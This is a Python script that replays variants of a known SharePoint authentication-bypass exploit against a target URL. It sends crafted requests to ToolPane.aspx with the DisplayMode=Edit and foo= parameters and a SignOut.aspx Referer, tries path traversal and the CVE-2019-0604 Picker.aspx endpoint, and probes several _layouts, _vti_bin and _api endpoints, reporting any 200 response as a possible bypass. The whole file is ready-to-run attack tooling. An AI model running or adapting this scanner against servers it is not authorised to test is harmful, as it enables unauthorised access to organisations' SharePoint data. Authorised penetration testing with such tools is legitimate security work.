#!/usr/bin/env python3
"""
Test authentication bypass variations based on original exploit
Focus: Endpoint, query parameters, headers that might bypass authentication

Based on original exploit targeting:
POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx
Referer: /_layouts/SignOut.aspx
User-Agent: Mobile browser
"""

import requests
import argparse

def test_endpoint_auth(target_url, endpoint, params="", headers_extra={}, method="GET", description=""):
    """Test if an endpoint bypasses authentication"""
    print(f"\n[*] Testing: {description}")
    print(f"    Endpoint: {endpoint}")
    if params:
        print(f"    Params: {params}")

    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }
    base_headers.update(headers_extra)

    url = f"{target_url}{endpoint}"
    if params:
        url = f"{url}?{params}"

    try:
        if method == "GET":
            response = requests.get(url, headers=base_headers, allow_redirects=False, timeout=10)
        else:  # POST
            response = requests.post(url, headers=base_headers, data="", allow_redirects=False, timeout=10)

        print(f"    Status: {response.status_code}")

        # Check if authentication was bypassed
        if response.status_code == 200:
            print(f"    [+] SUCCESS: 200 OK - Authentication might be bypassed!")
            print(f"    Response (first 200 chars): {response.text[:200]}")
            return True
        elif response.status_code == 401:
            print(f"    [-] 401 Unauthorized - Auth required")
            if "WWW-Authenticate" in response.headers:
                print(f"    WWW-Authenticate: {response.headers['WWW-Authenticate']}")
        elif response.status_code in [302, 301]:
            print(f"    [~] Redirect to: {response.headers.get('Location', 'N/A')}")
        elif response.status_code == 403:
            print(f"    [-] 403 Forbidden")
        elif response.status_code == 404:
            print(f"    [-] 404 Not Found")
        else:
            print(f"    [?] Unexpected status: {response.status_code}")

        return False
    except Exception as e:
        print(f"    [!] Error: {str(e)[:100]}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Test authentication bypass variants")
    parser.add_argument("--url", required=True, help="Target SharePoint URL")
    args = parser.parse_args()

    target_url = args.url.rstrip('/')

    print("[*] Testing Authentication Bypass Variants")
    print("=" * 70)

    # Test 1: Original exploit endpoint with GET (minimal test)
    test_endpoint_auth(target_url, "/_layouts/15/ToolPane.aspx",
                      params="DisplayMode=Edit&foo=/ToolPane.aspx",
                      method="GET",
                      description="Original exploit endpoint with GET")

    # Test 2: Original endpoint with POST
    test_endpoint_auth(target_url, "/_layouts/15/ToolPane.aspx",
                      params="DisplayMode=Edit&foo=/ToolPane.aspx",
                      headers_extra={"Referer": "/_layouts/SignOut.aspx"},
                      method="POST",
                      description="Original exploit endpoint with POST + Referer")

    # Test 3: ToolPane.aspx without params
    test_endpoint_auth(target_url, "/_layouts/15/ToolPane.aspx",
                      description="ToolPane.aspx without query params")

    # Test 4: ToolPane.aspx with only DisplayMode=Edit
    test_endpoint_auth(target_url, "/_layouts/15/ToolPane.aspx",
                      params="DisplayMode=Edit",
                      description="ToolPane.aspx with DisplayMode=Edit only")

    # Test 5: Test with different foo parameter values (path traversal attempt)
    test_endpoint_auth(target_url, "/_layouts/15/ToolPane.aspx",
                      params="DisplayMode=Edit&foo=/../ToolPane.aspx",
                      description="ToolPane.aspx with path traversal in foo")

    # Test 6: Test with SignOut.aspx Referer on different endpoint
    test_endpoint_auth(target_url, "/_layouts/15/start.aspx",
                      headers_extra={"Referer": "/_layouts/SignOut.aspx"},
                      description="start.aspx with SignOut Referer")

    # Test 7: Picker.aspx (CVE-2019-0604 endpoint)
    test_endpoint_auth(target_url, "/_layouts/15/Picker.aspx",
                      params="PickerDialogType=Microsoft.SharePoint.Portal.WebControls.ItemPickerDialog",
                      description="Picker.aspx (CVE-2019-0604 endpoint)")

    # Test 8: Various /_layouts/ endpoints that might bypass auth
    layouts_endpoints = [
        ("/_layouts/15/viewlsts.aspx", "View Lists page"),
        ("/_layouts/15/settings.aspx", "Settings page"),
        ("/_layouts/15/quicklinks.aspx", "Quick Links"),
        ("/_layouts/15/quicklinksdialogform.aspx", "Quick Links Dialog"),
    ]

    for endpoint, desc in layouts_endpoints:
        test_endpoint_auth(target_url, endpoint, description=desc)

    # Test 9: _vti_bin endpoints (from historical research)
    vti_endpoints = [
        ("/_vti_bin/client.svc", "Client service"),
        ("/_vti_bin/WebPartPages.asmx", "WebPartPages service"),
        ("/_vti_bin/listdata.svc", "List data service"),
    ]

    for endpoint, desc in vti_endpoints:
        test_endpoint_auth(target_url, endpoint, description=f"_vti_bin/{desc}")

    # Test 10: API endpoints
    test_endpoint_auth(target_url, "/_api/web/currentuser",
                      description="_api/web/currentuser (should require auth)")

    print("\n[*] All authentication bypass variants tested")
    print("[*] Summary: Check above for any endpoints that returned 200 OK")

if __name__ == "__main__":
    main()
